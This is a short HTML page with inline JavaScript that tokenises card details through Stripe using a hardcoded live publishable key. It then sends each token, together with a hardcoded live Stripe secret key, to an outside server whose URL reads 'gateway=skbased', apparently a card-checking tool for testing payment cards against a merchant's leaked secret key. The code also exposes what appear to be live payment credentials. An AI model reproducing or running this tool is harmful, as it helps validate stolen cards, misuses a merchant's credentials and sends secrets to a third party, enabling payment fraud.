<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Card → Token → API Response</title>
<script src="https://js.stripe.com/v3/"></script>
<style>
:root{
  --bg:#f4f7fb; --card:#fff; --muted:#6b7280;
  --accent1:#667eea; --accent2:#764ba2; --shadow:0 12px 30px rgba(17,24,39,0.06);
}
body{margin:0;font-family:Inter,Arial,sans-serif;background:var(--bg);display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:24px;}
.container{display:grid;grid-template-columns:1fr 1fr;gap:20px;width:100%;max-width:900px;}
.panel{background:var(--card);border-radius:12px;padding:20px;box-shadow:var(--shadow);}
h2{margin-top:0;font-size:18px;color:#0f172a;}
.stripe-element{padding:12px;border-radius:10px;border:1px solid #e6eef8;background:#fbfdff;margin-bottom:12px;}
.result{font-family:monospace;font-size:13px;background:#0f172a;color:#e6eef8;padding:12px;border-radius:8px;overflow:auto;max-height:500px;white-space:pre-wrap;}
</style>
</head>
<body>

<div class="container">
  <!-- LEFT COLUMN: Token -->
  <div class="panel">
    <h2>Card & Token</h2>
    <div id="card-element" class="stripe-element"></div>
    <div id="tokenResult" class="result">Token will appear here...</div>
  </div>

  <!-- RIGHT COLUMN: API Response -->
  <div class="panel">
    <h2>API Response</h2>
    <div id="apiResult" class="result">Response will appear here...</div>
  </div>
</div>

<script>
(async()=>{
  // ---------------- CONFIG ----------------
  const STRIPE_PK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";
  const SERVER_API = "https://phop.onrender.com/gateway=skbased/key=rockysoon";
  const SECRET_KEY = "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";

  const tokenEl = document.getElementById('tokenResult');
  const apiEl = document.getElementById('apiResult');

  // ---------------- INIT STRIPE ----------------
  const stripe = Stripe(STRIPE_PK);
  const elements = stripe.elements();
  const card = elements.create('card', {style:{base:{fontSize:'16px',color:'#0f172a','::placeholder':{color:'#6b7280'}},invalid:{color:'#f87171'}}});
  card.mount('#card-element');

  card.on('change', async (event)=>{
    if(event.complete){
      tokenEl.textContent = "Generating token...";
      try{
        const {token, error} = await stripe.createToken(card);
        if(error){
          tokenEl.textContent = "Token error: "+error.message;
          return;
        }
        tokenEl.textContent = token.id;

        // Send token + secret key to server automatically
        apiEl.textContent = "Sending to API...";
        const url = SERVER_API + "?token=" + encodeURIComponent(token.id) + "&sk_key=" + encodeURIComponent(SECRET_KEY);
        const resp = await fetch(url);
        const text = await resp.text();
        try{
          apiEl.textContent = JSON.stringify(JSON.parse(text), null, 2);
        }catch{
          apiEl.textContent = text;
        }
      }catch(err){
        apiEl.textContent = "API request failed: "+err;
      }
    }else if(event.error){
      tokenEl.textContent = "Card input error: "+event.error.message;
    }else{
      tokenEl.textContent = "Enter card details...";
      apiEl.textContent = "Response will appear here...";
    }
  });
})();
</script>

</body>
</html>
